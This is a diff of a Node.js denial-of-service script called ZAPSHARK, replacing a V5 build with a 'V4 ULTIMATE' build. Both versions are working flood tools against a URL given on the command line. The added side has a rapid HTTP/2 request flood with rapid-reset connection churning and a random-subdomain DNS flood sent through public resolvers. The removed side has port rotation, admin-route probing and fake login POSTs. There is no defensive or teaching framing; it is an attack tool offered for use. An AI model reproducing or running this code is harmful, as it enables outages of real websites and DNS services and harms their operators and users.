@@ -1,15 +1,12 @@
 const http2 = require('http2');
-const http = require('http');
-const https = require('https');
+const dgram = require('dgram');
 const os = require('os');
 const { exec } = require('child_process');
 
-class ZAPSHARK_V5 {
+class ZAPSHARK_V4_ULTIMATE {
     constructor(targetUrl) {
-        const url = new URL(targetUrl);
-        this.baseUrl = targetUrl;
-        this.hostname = url.hostname;
-        this.protocol = url.protocol;
+        this.targetUrl = targetUrl;
+        this.hostname = new URL(targetUrl).hostname;
         this.status = "ATTACKING";
         this.totalRequests = 0;
         this.currentRPS = 0;
@@ -18,253 +15,146 @@ class ZAPSHARK_V5 {
         this.lastRpsCalc = Date.now();
         this.running = true;
         
-        // === CONNECTION SYSTEM ===
+        // CONNECTION SYSTEM
         this.connectionPool = [];
-        this.connCount = 14; // Prime number
-        this.maxStreamsPerConn = 1000;
+        this.connCount = 12;
         
-        // === METHOD ROTATION ===
-        this.methods = ['GET', 'HEAD', 'POST'];
-        this.methodRatios = { 'GET': 0.89, 'HEAD': 0.10, 'POST': 0.01 };
-        this.methodCounter = { 'GET': 0, 'HEAD': 0, 'POST': 0 };
+        // REQUEST RATIO (89% HEAD, 10% GET, 1% POST)
+        this.headCount = 0;
+        this.getCount = 0;
         
-        // === PORT ROTATION ===
-        this.ports = [443, 80, 8080, 8443, 3000];
-        this.currentPortIndex = 0;
-        this.portChangeCounter = 0;
-        this.portChangeThreshold = 10000; // Change every 10k requests
+        // RAPID RESET
+        this.lastConnectionReset = Date.now();
+        this.resetInterval = 700; // 500-850ms
         
-        // === ROUTE DISCOVERY ===
-        this.discoveredRoutes = new Set(['/']);
-        this.commonRoutes = [
-            '/api', '/api/v1', '/api/v2', '/admin', '/login', '/dashboard',
-            '/user', '/users', '/account', '/profile', '/settings',
-            '/wp-admin', '/wp-login.php', '/administrator', '/backend',
-            '/console', '/manager', '/system', '/config', '/test',
-            '/debug', '/status', '/health', '/metrics', '/info',
-            '/public', '/private', '/secure', '/auth', '/oauth',
-            '/graphql', '/rest', '/soap', '/xmlrpc', '/rpc',
-            '/index.php', '/index.html', '/home', '/main', '/app'
-        ];
-        this.routeDiscoveryActive = true;
-        this.routeDiscoveryInterval = 30000; // Every 30 seconds
+        // PAYLOAD SYSTEM
+        this.payloadCounter = 0;
+        this.payloadThreshold = 1000000 + Math.random() * 4000000;
         
-        // === RESPONSE TRACKING ===
-        this.responseCodes = new Map();
-        this.lastResponseCode = 200;
+        // DNS SPAM SYSTEM
+        this.dnsSocket = dgram.createSocket('udp4');
+        this.dnsQueries = 0;
+        this.lastDnsFlood = Date.now();
         
-        // === MAINTENANCE ===
+        // RESPONSE TRACKING
+        this.lastResponseCode = 0;
+        this.responseCodes = {};
+        
+        // MAINTENANCE
         this.lastMaintenance = Date.now();
-        this.maintenanceInterval = 300000; // 5 minutes
-        this.maintenanceDuration = 120000; // 2 minutes
         this.maintenanceActive = false;
         
-        // === PAYLOAD FOR POST ===
-        this.postPayloads = [
-            'username=admin&password=test123',
-            'email=test@test.com&token=abc123',
-            'action=login&submit=true',
-            'query=SELECT * FROM users',
-            'data={"test":true,"id":123}'
-        ];
-        
-        // === INTERVALS ===
+        // INTERVALS
         this.attackInterval = null;
         this.mainLoop = null;
-        this.displayInterval = null;
-        this.routeDiscoveryTimer = null;
+        this.dnsInterval = null;
     }
 
-    // === INITIALIZATION ===
-    async initialize() {
-        console.log('=== ZAPSHARK V5 - STRATEGIC HAMMER ===');
-        console.log('Target:', this.baseUrl);
-        console.log('Connections:', this.connCount);
-        console.log('Ports:', this.ports.join(', '));
-        console.log('Methods:', this.methods.join('/'));
-        console.log('='.repeat(60));
-        
-        // BUILD CONNECTION POOL
-        this.buildConnectionPool();
-        
-        // INITIAL ROUTE DISCOVERY
-        await this.discoverRoutes();
-        
-        // START SYSTEMS
-        this.startSystems();
-        
-        // INITIAL DISPLAY
-        this.updateDisplay();
+    // === CONNECTION SYSTEM ===
+    createConnection() {
+        try {
+            const client = http2.connect(this.targetUrl, {
+                maxSessionMemory: 65536
+            });
+            
+            client.setMaxListeners(1000);
+            client.on('error', () => {});
+            
+            return { client, created: Date.now(), requests: 0 };
+        } catch (err) {
+            return null;
+        }
     }
 
-    // === CONNECTION POOL ===
     buildConnectionPool() {
         this.connectionPool = [];
-        const targetUrl = this.getCurrentTargetUrl();
-        
         for (let i = 0; i < this.connCount; i++) {
-            try {
-                const client = http2.connect(targetUrl, {
-                    maxSessionMemory: 65536
-                });
-                
-                client.setMaxListeners(1000);
-                client.on('error', () => {});
-                
-                this.connectionPool.push(client);
-            } catch (err) {
-                // Retry later
+            const conn = this.createConnection();
+            if (conn) {
+                this.connectionPool.push(conn);
             }
         }
     }
 
-    getCurrentTargetUrl() {
-        const port = this.ports[this.currentPortIndex];
-        return `${this.protocol}//${this.hostname}:${port}`;
-    }
-
-    // === PORT ROTATION ===
-    rotatePort() {
-        this.portChangeCounter++;
-        if (this.portChangeCounter >= this.portChangeThreshold) {
-            this.currentPortIndex = (this.currentPortIndex + 1) % this.ports.length;
-            this.portChangeCounter = 0;
+    // === RAPID RESET ===
+    performRapidReset() {
+        const now = Date.now();
+        if (now - this.lastConnectionReset >= this.resetInterval) {
+            // AUTO ADJUST 500-850ms
+            this.resetInterval = 500 + Math.random() * 350;
             
-            // REBUILD CONNECTIONS WITH NEW PORT
-            this.connectionPool.forEach(client => {
-                try { client.destroy(); } catch (err) {}
-            });
-            this.buildConnectionPool();
-        }
-    }
-
-    // === ROUTE DISCOVERY ===
-    async discoverRoutes() {
-        if (!this.routeDiscoveryActive || this.maintenanceActive) return;
-        
-        console.log('[~] Discovering routes...');
-        
-        const promises = [];
-        const discovered = new Set();
-        
-        // TEST COMMON ROUTES
-        for (const route of this.commonRoutes) {
-            promises.push(this.testRoute(route).then(found => {
-                if (found) {
-                    this.discoveredRoutes.add(route);
-                    discovered.add(route);
+            // RESET 25% OF CONNECTIONS
+            const resetCount = Math.ceil(this.connectionPool.length * 0.25);
+            
+            for (let i = 0; i < resetCount; i++) {
+                const index = Math.floor(Math.random() * this.connectionPool.length);
+                if (this.connectionPool[index]) {
+                    try {
+                        this.connectionPool[index].client.destroy();
+                        const newConn = this.createConnection();
+                        if (newConn) {
+                            this.connectionPool[index] = newConn;
+                        }
+                    } catch (err) {}
                 }
-            }));
-            
-            // TEST WITH EXTENSIONS
-            const extensions = ['', '.php', '.html', '.aspx', '.jsp', '/'];
-            for (const ext of extensions) {
-                promises.push(this.testRoute(route + ext).then(found => {
-                    if (found) {
-                        const fullRoute = route + ext;
-                        this.discoveredRoutes.add(fullRoute);
-                        discovered.add(fullRoute);
-                    }
-                }));
             }
-        }
-        
-        await Promise.all(promises);
-        
-        if (discovered.size > 0) {
-            console.log(`[+] Discovered ${discovered.size} new routes`);
+            
+            this.lastConnectionReset = now;
         }
     }
 
-    async testRoute(route) {
-        return new Promise((resolve) => {
-            const options = {
-                hostname: this.hostname,
-                port: 443,
-                path: route,
-                method: 'HEAD',
-                timeout: 3000
-            };
-            
-            const req = https.request(options, (res) => {
-                const code = res.statusCode;
-                if (code >= 200 && code < 500 && code !== 404) {
-                    this.responseCodes.set(code, (this.responseCodes.get(code) || 0) + 1);
-                    resolve(true);
-                } else {
-                    resolve(false);
-                }
-                res.destroy();
-            });
-            
-            req.on('error', () => resolve(false));
-            req.on('timeout', () => {
-                req.destroy();
-                resolve(false);
-            });
-            
-            req.end();
-        });
-    }
-
-    getRandomRoute() {
-        const routes = Array.from(this.discoveredRoutes);
-        if (routes.length === 0) return '/';
-        return routes[Math.floor(Math.random() * routes.length)];
-    }
-
-    // === METHOD SELECTION ===
-    getNextMethod() {
-        const rand = Math.random();
-        let cumulative = 0;
+    // === REQUEST TYPE SELECTOR ===
+    getRequestType() {
+        const rand = Math.random() * 100;
         
-        for (const [method, ratio] of Object.entries(this.methodRatios)) {
-            cumulative += ratio;
-            if (rand <= cumulative) {
-                this.methodCounter[method]++;
-                return method;
-            }
+        // 89% HEAD, 10% GET, 1% POST
+        if (rand < 89) {
+            this.headCount++;
+            return 'HEAD';
+        } else if (rand < 99) {
+            this.getCount++;
+            return 'GET';
+        } else {
+            return 'POST';
         }
-        
-        return 'GET'; // fallback
     }
 
     // === ATTACK SYSTEM ===
     sendRequest() {
         if (this.maintenanceActive || this.connectionPool.length === 0) return;
         
-        const client = this.connectionPool[Math.floor(Math.random() * this.connectionPool.length)];
-        if (!client) return;
+        // CHECK FOR PAYLOAD
+        const sendPayload = this.payloadCounter++ >= this.payloadThreshold;
+        if (sendPayload) {
+            this.payloadCounter = 0;
+            this.payloadThreshold = 1000000 + Math.random() * 4000000;
+        }
         
-        const method = this.getNextMethod();
-        const route = this.getRandomRoute();
+        const conn = this.connectionPool[Math.floor(Math.random() * this.connectionPool.length)];
+        if (!conn) return;
+
+        const method = this.getRequestType();
         
         try {
             const headers = {
                 ':method': method,
-                ':path': route,
+                ':path': '/?' + Date.now(),
                 ':authority': this.hostname,
-                'user-agent': 'Mozilla/5.0',
-                'accept': '*/*'
+                'user-agent': 'Mozilla/5.0'
             };
             
-            // ADD HEADERS FOR POST
-            if (method === 'POST') {
-                headers['content-type'] = 'application/x-www-form-urlencoded';
-                headers['content-length'] = '32';
+            // ADD PAYLOAD HEADER IF TIME
+            if (sendPayload) {
+                headers['x-payload'] = 'T.Ø.Š-$HĀRKWIRE-TØR';
             }
             
-            const req = client.request(headers);
-            
-            if (method === 'POST') {
-                const payload = this.postPayloads[Math.floor(Math.random() * this.postPayloads.length)];
-                req.write(payload);
-            }
+            const req = conn.client.request(headers);
+            conn.requests++;
             
             req.on('response', (headers) => {
-                const code = headers[':status'];
+                const code = headers[':status'] || 0;
                 this.lastResponseCode = code;
-                this.responseCodes.set(code, (this.responseCodes.get(code) || 0) + 1);
+                this.responseCodes[code] = (this.responseCodes[code] || 0) + 1;
                 req.destroy();
             });
             
@@ -285,23 +175,118 @@ class ZAPSHARK_V5 {
         }
     }
 
-    // === MAINTENANCE SYSTEM ===
+    // === DNS SPAM SYSTEM ===
+    startDnsSpam() {
+        this.dnsInterval = setInterval(() => {
+            // SEND 50 DNS QUERIES PER INTERVAL
+            for (let i = 0; i < 50; i++) {
+                try {
+                    const dnsQuery = this.createDnsQuery();
+                    this.dnsSocket.send(dnsQuery, 53, '8.8.8.8', (err) => {
+                        if (!err) this.dnsQueries++;
+                    });
+                    
+                    // ALSO SEND TO 1.1.1.1
+                    this.dnsSocket.send(dnsQuery, 53, '1.1.1.1', (err) => {
+                        if (!err) this.dnsQueries++;
+                    });
+                } catch (err) {}
+            }
+            
+            // FLUSH DNS CACHE EVERY 10s
+            if (Date.now() - this.lastDnsFlood > 10000) {
+                exec('ipconfig /flushdns >nul 2>&1 || echo ""', () => {});
+                this.lastDnsFlood = Date.now();
+            }
+        }, 100);
+    }
+
+    createDnsQuery() {
+        // CREATE RANDOM DNS QUERY
+        const randomSubdomain = Math.random().toString(36).substring(2, 15) + '.' + this.hostname;
+        const buf = Buffer.alloc(512);
+        
+        // SIMPLE DNS HEADER
+        buf.writeUInt16BE(Math.floor(Math.random() * 65535), 0); // ID
+        buf[2] = 0x01; // Standard query
+        buf[3] = 0x00; // Flags
+        buf.writeUInt16BE(0x0001, 4); // Questions
+        buf.writeUInt16BE(0x0000, 6); // Answer RRs
+        buf.writeUInt16BE(0x0000, 8); // Authority RRs
+        buf.writeUInt16BE(0x0000, 10); // Additional RRs
+        
+        // WRITE DOMAIN
+        let pos = 12;
+        const parts = randomSubdomain.split('.');
+        parts.forEach(part => {
+            buf[pos++] = part.length;
+            buf.write(part, pos);
+            pos += part.length;
+        });
+        buf[pos++] = 0x00; // End of domain
+        
+        // QUERY TYPE A (1), CLASS IN (1)
+        buf.writeUInt16BE(0x0001, pos); pos += 2;
+        buf.writeUInt16BE(0x0001, pos); pos += 2;
+        
+        return buf.slice(0, pos);
+    }
+
+    // === STABILITY ===
+    flushMemory() {
+        // DROP INACTIVE CONNECTIONS EVERY 10s
+        const now = Date.now();
+        if (now % 10000 < 100) { // Every ~10s
+            this.connectionPool = this.connectionPool.filter(conn => {
+                try {
+                    if (conn.requests === 0 && (now - conn.created) > 15000) {
+                        conn.client.destroy();
+                        return false;
+                    }
+                    return true;
+                } catch (err) {
+                    return false;
+                }
+            });
+            
+            // REFILL POOL
+            while (this.connectionPool.length < this.connCount) {
+                const newConn = this.createConnection();
+                if (newConn) {
+                    this.connectionPool.push(newConn);
+                }
+            }
+        }
+    }
+
+    throttleCPU() {
+        // AUTO THROTTLE BASED ON LOAD
+        const load = os.loadavg()[0] / os.cpus().length;
+        if (load > 0.85) {
+            this.resetInterval = Math.min(850, this.resetInterval + 50);
+        } else if (load < 0.70) {
+            this.resetInterval = Math.max(500, this.resetInterval - 30);
+        }
+    }
+
+    // === MAINTENANCE ===
     checkMaintenance() {
         const now = Date.now();
         
-        if (!this.maintenanceActive && now - this.lastMaintenance >= this.maintenanceInterval) {
+        if (!this.maintenanceActive && now - this.lastMaintenance >= 1200000) { // 20 mins
             this.startMaintenance();
         }
         
-        if (this.maintenanceActive && now - this.lastMaintenance >= (this.maintenanceInterval + this.maintenanceDuration)) {
+        if (this.maintenanceActive && now - this.lastMaintenance >= 2400000) { // 40 mins total
             this.endMaintenance();
         }
     }
 
     startMaintenance() {
-        console.log('\n[!] MAINTENANCE STARTED - COOLING 2 MINUTES [!]');
+        console.log('\n[!] MAINTENANCE - COOLING 20 MINUTES [!]');
         this.status = "COOLING";
         this.maintenanceActive = true;
+        this.lastMaintenance = Date.now();
         
         // STOP ATTACKS
         if (this.attackInterval) {
@@ -309,18 +294,34 @@ class ZAPSHARK_V5 {
             this.attackInterval = null;
         }
         
-        // CLEAR CONNECTIONS
-        this.connectionPool.forEach(client => {
-            try { client.destroy(); } catch (err) {}
-        });
-        this.connectionPool = [];
+        // STOP DNS SPAM
+        if (this.dnsInterval) {
+            clearInterval(this.dnsInterval);
+            this.dnsInterval = null;
+        }
         
-        // FLUSH DNS
-        exec('ipconfig /flushdns >nul 2>&1 || sudo dscacheutil -flushcache 2>/dev/null || true', () => {});
+        // FLUSH EVERYTHING IN BACKGROUND
+        this.backgroundFlush();
+    }
+
+    backgroundFlush() {
+        if (!this.maintenanceActive) return;
+        
+        const flushInterval = setInterval(() => {
+            if (!this.maintenanceActive) {
+                clearInterval(flushInterval);
+                return;
+            }
+            
+            // FLUSH EVERY 1 MINUTE
+            exec('ipconfig /flushdns >nul 2>&1 || echo ""', () => {});
+            exec('echo 1 > /proc/sys/net/ipv4/tcp_tw_reuse 2>/dev/null || echo ""', () => {});
+            
+        }, 60000);
     }
 
     endMaintenance() {
-        console.log('\n[+] MAINTENANCE COMPLETE - RESUMING ATTACK [+]');
+        console.log('\n[+] MAINTENANCE COMPLETE - RESUMING [+]');
         this.status = "ATTACKING";
         this.maintenanceActive = false;
         this.lastMaintenance = Date.now();
@@ -328,15 +329,14 @@ class ZAPSHARK_V5 {
         // REBUILD CONNECTIONS
         this.buildConnectionPool();
         
-        // RESTART ATTACK
+        // RESTART SYSTEMS
         setTimeout(() => {
             this.startAttackLoop();
-            // REDISCOVER ROUTES
-            this.discoverRoutes();
-        }, 1000);
+            this.startDnsSpam();
+        }, 2000);
     }
 
-    // === DISPLAY ===
+    // === LOGGING ===
     calculateRPS() {
         const now = Date.now();
         const timeDiff = (now - this.lastRpsCalc) / 1000;
@@ -348,127 +348,103 @@ class ZAPSHARK_V5 {
         }
     }
 
-    getTopResponseCodes() {
-        const entries = Array.from(this.responseCodes.entries());
-        if (entries.length === 0) return "200";
+    getMostCommonResponse() {
+        let maxCount = 0;
+        let commonCode = this.lastResponseCode || 0;
         
-        // Sort by frequency
-        entries.sort((a, b) => b[1] - a[1]);
-        
-        // Get top 3 codes
-        const topCodes = entries.slice(0, 3).map(e => e[0]);
-        return topCodes.join(', ');
-    }
-
-    getActivePortsCount() {
-        const uniquePorts = new Set(this.ports.slice(0, this.currentPortIndex + 1));
-        return uniquePorts.size;
-    }
-
-    getMethodDisplay() {
-        const total = Object.values(this.methodCounter).reduce((a, b) => a + b, 0);
-        if (total === 0) return "GET/HEAD/POST";
-        
-        const percentages = this.methods.map(m => {
-            const percent = total > 0 ? (this.methodCounter[m] / total * 100).toFixed(0) : "0";
-            return `${m}:${percent}%`;
-        });
-        
-        return percentages.join(' ');
-    }
-
-    getTimeUntilMaintenance() {
-        if (this.maintenanceActive) {
-            const timeLeft = (this.maintenanceInterval + this.maintenanceDuration) - (Date.now() - this.lastMaintenance);
-            const minutes = Math.floor(timeLeft / 60000);
-            const seconds = Math.floor((timeLeft % 60000) / 1000);
-            return `${minutes}:${seconds.toString().padStart(2, '0')}`;
-        } else {
-            const timeLeft = this.maintenanceInterval - (Date.now() - this.lastMaintenance);
-            const minutes = Math.floor(timeLeft / 60000);
-            const seconds = Math.floor((timeLeft % 60000) / 1000);
-            return `${minutes}:${seconds.toString().padStart(2, '0')}`;
+        for (const [code, count] of Object.entries(this.responseCodes)) {
+            if (count > maxCount) {
+                maxCount = count;
+                commonCode = parseInt(code);
+            }
         }
+        return commonCode;
     }
 
     updateDisplay() {
         this.calculateRPS();
         
         const runtime = Math.floor((Date.now() - this.startTime) / 1000);
-        const minutes = Math.floor(runtime / 60);
+        const hours = Math.floor(runtime / 3600);
+        const minutes = Math.floor((runtime % 3600) / 60);
         const seconds = runtime % 60;
-        const runtimeStr = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        const runtimeStr = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        
+        const maintenanceTime = this.maintenanceActive ? 
+            `${Math.floor((2400000 - (Date.now() - this.lastMaintenance)) / 60000)}m` :
+            `${Math.floor((1200000 - (Date.now() - this.lastMaintenance)) / 60000)}m`;
         
         process.stdout.write('\x1B[2J\x1B[0f');
         console.log(`ZAP-SHARK — (${runtimeStr}) | STATUS: ${this.status}`);
         console.log('============================');
         console.log(`SHARK-TRS — ${this.totalRequests.toLocaleString()}`);
-        console.log(`SHARK-LHC — ${this.getTopResponseCodes()}`);
-        console.log(`SHARK-RPS — ${this.currentRPS.toFixed(1)}`);
+        console.log(`SHARK-LHC — ${this.getMostCommonResponse()}`);
         console.log('============================');
-        console.log(`Z-S | ROUTES: ${this.discoveredRoutes.size} | PORTS: ${this.getActivePortsCount()} | METHODS: ${this.getMethodDisplay()}`);
+        console.log(`ZAP-SHARK — CONNECTIONS: ${this.connectionPool.length} | DNS: ${this.dnsQueries.toLocaleString()}`);
+        console.log(`RPS: ${this.currentRPS.toFixed(1)} | HEAD/GET: ${this.headCount}/${this.getCount}`);
+        console.log(`NEXT MAINTENANCE: ${maintenanceTime} | PAYLOAD IN: ${(this.payloadThreshold - this.payloadCounter).toLocaleString()}`);
         console.log('============================');
-        console.log(`Z-S | MAINTENANCE: ${this.getTimeUntilMaintenance()}`);
     }
 
-    // === MAIN SYSTEMS ===
+    // === MAIN ===
     startAttackLoop() {
         if (this.attackInterval) clearInterval(this.attackInterval);
         
         this.attackInterval = setInterval(() => {
             if (!this.maintenanceActive) {
-                // SEND MULTIPLE REQUESTS PER TICK
-                for (let i = 0; i < 5; i++) {
+                // SEND 10 REQUESTS PER TICK
+                for (let i = 0; i < 10; i++) {
                     this.sendRequest();
-                    this.rotatePort();
                 }
             }
-        }, 0.1);
+        }, 0.05); // FAST LOOP
     }
 
-    startSystems() {
-        // MAIN LOOP
-        this.mainLoop = setInterval(() => {
-            this.checkMaintenance();
-        }, 1000);
-        
-        // DISPLAY UPDATE
-        this.displayInterval = setInterval(() => {
-            this.updateDisplay();
-        }, 100);
-        
-        // ROUTE DISCOVERY
-        this.routeDiscoveryTimer = setInterval(() => {
-            if (!this.maintenanceActive) {
-                this.discoverRoutes();
-            }
-        }, this.routeDiscoveryInterval);
-        
-        // START ATTACK
-        this.startAttackLoop();
-    }
-
-    // === START ===
     start() {
-        this.initialize();
+        console.log('=== ZAP-SHARK V4 ULTIMATE ===');
+        console.log('Target:', this.targetUrl);
+        console.log('Ratio: HEAD 89% | GET 10% | POST 1%');
+        console.log('DNS Spam: Active');
+        console.log('='.repeat(50));
+        
+        this.buildConnectionPool();
+        
+        setTimeout(() => {
+            // MAIN LOOP
+            this.mainLoop = setInterval(() => {
+                this.performRapidReset();
+                this.flushMemory();
+                this.throttleCPU();
+                this.checkMaintenance();
+                this.updateDisplay();
+            }, 100);
+            
+            // ATTACK LOOP
+            this.startAttackLoop();
+            
+            // DNS SPAM
+            this.startDnsSpam();
+            
+        }, 2000);
         
         process.on('SIGINT', () => {
-            console.log('\n\n=== ZAPSHARK V5 FINISHED ===');
+            console.log('\n\n=== FINAL STATS ===');
             console.log(`Total Requests: ${this.totalRequests.toLocaleString()}`);
-            console.log(`Peak RPS: ${this.currentRPS.toFixed(1)}`);
-            console.log(`Discovered Routes: ${this.discoveredRoutes.size}`);
-            console.log(`Methods Used: ${JSON.stringify(this.methodCounter)}`);
+            console.log(`HEAD Requests: ${this.headCount.toLocaleString()}`);
+            console.log(`GET Requests: ${this.getCount.toLocaleString()}`);
+            console.log(`DNS Queries: ${this.dnsQueries.toLocaleString()}`);
             console.log('='.repeat(40));
             
             this.running = false;
             clearInterval(this.mainLoop);
-            clearInterval(this.displayInterval);
             clearInterval(this.attackInterval);
-            clearInterval(this.routeDiscoveryTimer);
+            clearInterval(this.dnsInterval);
             
-            this.connectionPool.forEach(client => {
-                try { client.destroy(); } catch (err) {}
+            this.connectionPool.forEach(conn => {
+                try { conn.client.destroy(); } catch (err) {}
             });
+            
+            if (this.dnsSocket) this.dnsSocket.close();
             
             process.exit(0);
         });
@@ -478,9 +454,9 @@ class ZAPSHARK_V5 {
 // USAGE
 const target = process.argv[2];
 if (!target || !target.startsWith('https://')) {
-    console.log('Usage: node zapshark-v5.js https://target.com');
+    console.log('Usage: node shark.js https://target.com');
     process.exit(1);
 }
 
-const shark = new ZAPSHARK_V5(target);
+const shark = new ZAPSHARK_V4_ULTIMATE(target);
 shark.start();
